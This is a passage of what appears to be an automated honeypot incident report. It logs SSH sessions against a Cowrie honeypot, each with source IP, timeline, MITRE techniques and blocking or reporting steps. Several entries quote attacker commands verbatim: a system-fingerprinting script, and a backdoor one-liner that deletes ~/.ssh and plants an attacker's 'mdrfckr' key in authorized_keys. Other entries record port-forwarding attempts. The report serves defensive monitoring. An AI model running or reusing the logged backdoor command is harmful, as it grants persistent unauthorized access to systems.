| `2026-07-27 09:15:09` | `cowrie.direct-tcpip.data` |
| `2026-07-27 09:15:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7a733164e05

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-07-27 09:22 |
| **Last Seen** | 2026-07-27 09:22 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:22:30` | `cowrie.session.connect` |
| `2026-07-27 09:22:31` | `cowrie.client.version` |
| `2026-07-27 09:22:31` | `cowrie.client.kex` |
| `2026-07-27 09:22:38` | `cowrie.login.success` |
| `2026-07-27 09:22:41` | `cowrie.session.params` |
| `2026-07-27 09:22:41` | `cowrie.command.input` |
| `2026-07-27 09:22:41` | `cowrie.command.input` |
| `2026-07-27 09:22:41` | `cowrie.command.input` |
| `2026-07-27 09:22:41` | `cowrie.command.input` |
| `2026-07-27 09:22:41` | `cowrie.command.input` |
| `2026-07-27 09:22:41` | `cowrie.command.success` |
| `2026-07-27 09:22:41` | `cowrie.command.input` |
| `2026-07-27 09:22:41` | `cowrie.command.input` |
| `2026-07-27 09:22:41` | `cowrie.command.input` |
| `2026-07-27 09:22:41` | `cowrie.command.input` |
| `2026-07-27 09:22:50` | `cowrie.log.closed` |
| `2026-07-27 09:22:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ba9d8e195dc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-27 09:26 |
| **Last Seen** | 2026-07-27 09:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:26:30` | `cowrie.session.connect` |
| `2026-07-27 09:26:30` | `cowrie.client.version` |
| `2026-07-27 09:26:30` | `cowrie.client.kex` |
| `2026-07-27 09:26:30` | `cowrie.login.success` |
| `2026-07-27 09:26:30` | `cowrie.direct-tcpip.request` |
| `2026-07-27 09:26:30` | `cowrie.direct-tcpip.ja4` |
| `2026-07-27 09:26:30` | `cowrie.direct-tcpip.data` |
| `2026-07-27 09:26:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5048eb6d2f1

| Field | Detail |
|---|---|
| **Source IP** | `115.241.228[.]34` |
| **First Seen** | 2026-07-27 09:27 |
| **Last Seen** | 2026-07-27 09:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:27:30` | `cowrie.session.connect` |
| `2026-07-27 09:27:31` | `cowrie.client.version` |
| `2026-07-27 09:27:31` | `cowrie.client.kex` |
| `2026-07-27 09:27:33` | `cowrie.login.success` |
| `2026-07-27 09:27:34` | `cowrie.direct-tcpip.request` |
| `2026-07-27 09:27:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.228[.]34` to AbuseIPDB if not already reported
- [ ] Block `115.241.228[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87fa540b7e61

| Field | Detail |
|---|---|
| **Source IP** | `218.149.235[.]152` |
| **First Seen** | 2026-07-27 09:28 |
| **Last Seen** | 2026-07-27 09:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:28:23` | `cowrie.session.connect` |
| `2026-07-27 09:28:24` | `cowrie.client.version` |
| `2026-07-27 09:28:24` | `cowrie.client.kex` |
| `2026-07-27 09:28:27` | `cowrie.login.success` |
| `2026-07-27 09:28:27` | `cowrie.direct-tcpip.request` |
| `2026-07-27 09:28:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.149.235[.]152` to AbuseIPDB if not already reported
- [ ] Block `218.149.235[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b71437d6897

| Field | Detail |
|---|---|
| **Source IP** | `196.188.187[.]85` |
| **First Seen** | 2026-07-27 09:28 |
| **Last Seen** | 2026-07-27 09:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:28:37` | `cowrie.session.connect` |
| `2026-07-27 09:28:37` | `cowrie.client.version` |
| `2026-07-27 09:28:37` | `cowrie.client.kex` |
| `2026-07-27 09:28:39` | `cowrie.login.success` |
| `2026-07-27 09:28:40` | `cowrie.direct-tcpip.request` |
| `2026-07-27 09:28:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.187[.]85` to AbuseIPDB if not already reported
- [ ] Block `196.188.187[.]85` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebd349feac88

| Field | Detail |
|---|---|
| **Source IP** | `87.103.126[.]54` |
| **First Seen** | 2026-07-27 09:30 |
| **Last Seen** | 2026-07-27 09:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:30:57` | `cowrie.session.connect` |
| `2026-07-27 09:30:58` | `cowrie.client.version` |
| `2026-07-27 09:30:58` | `cowrie.client.kex` |
| `2026-07-27 09:30:59` | `cowrie.login.success` |
| `2026-07-27 09:30:59` | `cowrie.direct-tcpip.request` |
| `2026-07-27 09:31:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.103.126[.]54` to AbuseIPDB if not already reported
- [ ] Block `87.103.126[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e748d37e0aba

| Field | Detail |
|---|---|
| **Source IP** | `190.223.36[.]108` |
| **First Seen** | 2026-07-27 09:31 |
| **Last Seen** | 2026-07-27 09:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:31:04` | `cowrie.session.connect` |
| `2026-07-27 09:31:05` | `cowrie.client.version` |
| `2026-07-27 09:31:05` | `cowrie.client.kex` |
| `2026-07-27 09:31:06` | `cowrie.login.success` |
| `2026-07-27 09:31:07` | `cowrie.direct-tcpip.request` |
| `2026-07-27 09:31:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.223.36[.]108` to AbuseIPDB if not already reported
- [ ] Block `190.223.36[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-394fc695f257

| Field | Detail |
|---|---|
| **Source IP** | `218.21.250[.]151` |
| **First Seen** | 2026-07-27 09:31 |
| **Last Seen** | 2026-07-27 09:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:31:47` | `cowrie.session.connect` |
| `2026-07-27 09:31:47` | `cowrie.client.version` |
| `2026-07-27 09:31:47` | `cowrie.client.kex` |
| `2026-07-27 09:31:49` | `cowrie.login.success` |
| `2026-07-27 09:31:50` | `cowrie.direct-tcpip.request` |
| `2026-07-27 09:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.21.250[.]151` to AbuseIPDB if not already reported
- [ ] Block `218.21.250[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d967a2ef2260

| Field | Detail |
|---|---|
| **Source IP** | `60.251.229[.]144` |
| **First Seen** | 2026-07-27 09:35 |
| **Last Seen** | 2026-07-27 09:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:35:04` | `cowrie.session.connect` |
| `2026-07-27 09:35:04` | `cowrie.client.version` |
| `2026-07-27 09:35:04` | `cowrie.client.kex` |
| `2026-07-27 09:35:06` | `cowrie.login.success` |
| `2026-07-27 09:35:07` | `cowrie.direct-tcpip.request` |
| `2026-07-27 09:35:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.251.229[.]144` to AbuseIPDB if not already reported
- [ ] Block `60.251.229[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64839abcc942

| Field | Detail |
|---|---|
| **Source IP** | `24.187.213[.]29` |
| **First Seen** | 2026-07-27 09:38 |
| **Last Seen** | 2026-07-27 09:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:38:13` | `cowrie.session.connect` |
| `2026-07-27 09:38:13` | `cowrie.client.version` |
| `2026-07-27 09:38:13` | `cowrie.client.kex` |
| `2026-07-27 09:38:14` | `cowrie.login.success` |
| `2026-07-27 09:38:14` | `cowrie.direct-tcpip.request` |
| `2026-07-27 09:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.187.213[.]29` to AbuseIPDB if not already reported
- [ ] Block `24.187.213[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daafc8468193

| Field | Detail |
|---|---|
| **Source IP** | `217.156.66[.]34` |
| **First Seen** | 2026-07-27 09:48 |
| **Last Seen** | 2026-07-27 09:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:48:25` | `cowrie.session.connect` |
| `2026-07-27 09:48:25` | `cowrie.client.version` |
| `2026-07-27 09:48:25` | `cowrie.client.kex` |
| `2026-07-27 09:48:26` | `cowrie.login.success` |
| `2026-07-27 09:48:27` | `cowrie.session.params` |
| `2026-07-27 09:48:27` | `cowrie.command.input` |
| `2026-07-27 09:48:27` | `cowrie.command.failed` |
| `2026-07-27 09:48:27` | `cowrie.log.closed` |
| `2026-07-27 09:48:28` | `cowrie.session.params` |
| `2026-07-27 09:48:28` | `cowrie.command.input` |
| `2026-07-27 09:48:28` | `cowrie.session.file_download` |
| `2026-07-27 09:48:28` | `cowrie.log.closed` |
| `2026-07-27 09:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.156.66[.]34` to AbuseIPDB if not already reported
- [ ] Block `217.156.66[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4567e40bc50e

| Field | Detail |
|---|---|
| **Source IP** | `217.156.66[.]34` |
| **First Seen** | 2026-07-27 09:48 |
| **Last Seen** | 2026-07-27 09:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:48:28` | `cowrie.session.connect` |
| `2026-07-27 09:48:28` | `cowrie.client.version` |
| `2026-07-27 09:48:28` | `cowrie.client.kex` |
| `2026-07-27 09:48:29` | `cowrie.login.success` |
| `2026-07-27 09:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.156.66[.]34` to AbuseIPDB if not already reported
- [ ] Block `217.156.66[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f75cae7f2cb

| Field | Detail |
|---|---|
| **Source IP** | `217.156.66[.]34` |
| **First Seen** | 2026-07-27 09:48 |
| **Last Seen** | 2026-07-27 09:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:48:29` | `cowrie.session.connect` |
| `2026-07-27 09:48:29` | `cowrie.client.version` |
| `2026-07-27 09:48:29` | `cowrie.client.kex` |
| `2026-07-27 09:48:30` | `cowrie.login.success` |
| `2026-07-27 09:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.156.66[.]34` to AbuseIPDB if not already reported
- [ ] Block `217.156.66[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-519d340b1a2f

| Field | Detail |
|---|---|
| **Source IP** | `46.101.216[.]224` |
| **First Seen** | 2026-07-27 09:58 |
| **Last Seen** | 2026-07-27 09:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:58:08` | `cowrie.session.connect` |
| `2026-07-27 09:58:08` | `cowrie.client.version` |
| `2026-07-27 09:58:08` | `cowrie.client.kex` |
| `2026-07-27 09:58:09` | `cowrie.login.success` |
| `2026-07-27 09:58:10` | `cowrie.session.params` |
| `2026-07-27 09:58:10` | `cowrie.command.input` |
| `2026-07-27 09:58:10` | `cowrie.command.failed` |
| `2026-07-27 09:58:10` | `cowrie.log.closed` |
| `2026-07-27 09:58:10` | `cowrie.session.params` |
| `2026-07-27 09:58:10` | `cowrie.command.input` |
| `2026-07-27 09:58:11` | `cowrie.session.file_download` |
| `2026-07-27 09:58:11` | `cowrie.log.closed` |
| `2026-07-27 09:58:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.216[.]224` to AbuseIPDB if not already reported
- [ ] Block `46.101.216[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b705ecd4ce78

| Field | Detail |
|---|---|
| **Source IP** | `46.101.216[.]224` |
| **First Seen** | 2026-07-27 09:58 |
| **Last Seen** | 2026-07-27 09:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:58:11` | `cowrie.session.connect` |
| `2026-07-27 09:58:11` | `cowrie.client.version` |
| `2026-07-27 09:58:11` | `cowrie.client.kex` |
| `2026-07-27 09:58:11` | `cowrie.login.success` |
| `2026-07-27 09:58:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.216[.]224` to AbuseIPDB if not already reported
- [ ] Block `46.101.216[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4f1f8dbcc63

| Field | Detail |
|---|---|
| **Source IP** | `46.101.216[.]224` |
| **First Seen** | 2026-07-27 09:58 |
| **Last Seen** | 2026-07-27 09:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:58:11` | `cowrie.session.connect` |
| `2026-07-27 09:58:11` | `cowrie.client.version` |
| `2026-07-27 09:58:11` | `cowrie.client.kex` |
| `2026-07-27 09:58:12` | `cowrie.login.success` |
| `2026-07-27 09:58:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.216[.]224` to AbuseIPDB if not already reported
- [ ] Block `46.101.216[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d952760cb14

| Field | Detail |
|---|---|
| **Source IP** | `62.183.82[.]70` |
| **First Seen** | 2026-07-27 09:59 |
| **Last Seen** | 2026-07-27 09:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:59:25` | `cowrie.session.connect` |
| `2026-07-27 09:59:25` | `cowrie.client.version` |
| `2026-07-27 09:59:25` | `cowrie.client.kex` |
| `2026-07-27 09:59:26` | `cowrie.login.success` |
| `2026-07-27 09:59:26` | `cowrie.direct-tcpip.request` |
| `2026-07-27 09:59:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.183.82[.]70` to AbuseIPDB if not already reported
- [ ] Block `62.183.82[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66d299bea07a

| Field | Detail |
|---|---|
| **Source IP** | `62.183.82[.]70` |
| **First Seen** | 2026-07-27 09:59 |
| **Last Seen** | 2026-07-27 09:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:59:36` | `cowrie.session.connect` |
| `2026-07-27 09:59:36` | `cowrie.client.version` |
| `2026-07-27 09:59:36` | `cowrie.client.kex` |
| `2026-07-27 09:59:37` | `cowrie.login.success` |
| `2026-07-27 09:59:37` | `cowrie.direct-tcpip.request` |
| `2026-07-27 09:59:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.183.82[.]70` to AbuseIPDB if not already reported
- [ ] Block `62.183.82[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cdf00f169f3

| Field | Detail |
|---|---|
| **Source IP** | `112.26.99[.]93` |
| **First Seen** | 2026-07-27 10:02 |
| **Last Seen** | 2026-07-27 10:03 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:02:52` | `cowrie.session.connect` |
| `2026-07-27 10:02:53` | `cowrie.client.version` |
| `2026-07-27 10:02:53` | `cowrie.client.kex` |
| `2026-07-27 10:02:56` | `cowrie.login.success` |
| `2026-07-27 10:02:57` | `cowrie.direct-tcpip.request` |
| `2026-07-27 10:03:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.26.99[.]93` to AbuseIPDB if not already reported
- [ ] Block `112.26.99[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43c60b68fb78

| Field | Detail |
|---|---|
| **Source IP** | `50.217.40[.]11` |
| **First Seen** | 2026-07-27 10:03 |
| **Last Seen** | 2026-07-27 10:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:03:04` | `cowrie.session.connect` |
| `2026-07-27 10:03:05` | `cowrie.client.version` |
| `2026-07-27 10:03:05` | `cowrie.client.kex` |
| `2026-07-27 10:03:06` | `cowrie.login.success` |
| `2026-07-27 10:03:06` | `cowrie.direct-tcpip.request` |
| `2026-07-27 10:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.40[.]11` to AbuseIPDB if not already reported
- [ ] Block `50.217.40[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2770a2d55880

| Field | Detail |
|---|---|
| **Source IP** | `163.7.9[.]55` |
| **First Seen** | 2026-07-27 10:03 |
| **Last Seen** | 2026-07-27 10:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:03:42` | `cowrie.session.connect` |
| `2026-07-27 10:03:42` | `cowrie.client.version` |
| `2026-07-27 10:03:42` | `cowrie.client.kex` |
| `2026-07-27 10:03:43` | `cowrie.login.success` |
| `2026-07-27 10:03:45` | `cowrie.session.params` |
| `2026-07-27 10:03:45` | `cowrie.command.input` |
| `2026-07-27 10:03:45` | `cowrie.command.failed` |
| `2026-07-27 10:03:45` | `cowrie.log.closed` |
| `2026-07-27 10:03:46` | `cowrie.session.params` |
| `2026-07-27 10:03:46` | `cowrie.command.input` |
| `2026-07-27 10:03:46` | `cowrie.session.file_download` |
| `2026-07-27 10:03:46` | `cowrie.log.closed` |
| `2026-07-27 10:03:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.9[.]55` to AbuseIPDB if not already reported
- [ ] Block `163.7.9[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-004c861ae532

| Field | Detail |
|---|---|
| **Source IP** | `163.7.9[.]55` |
| **First Seen** | 2026-07-27 10:03 |
| **Last Seen** | 2026-07-27 10:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
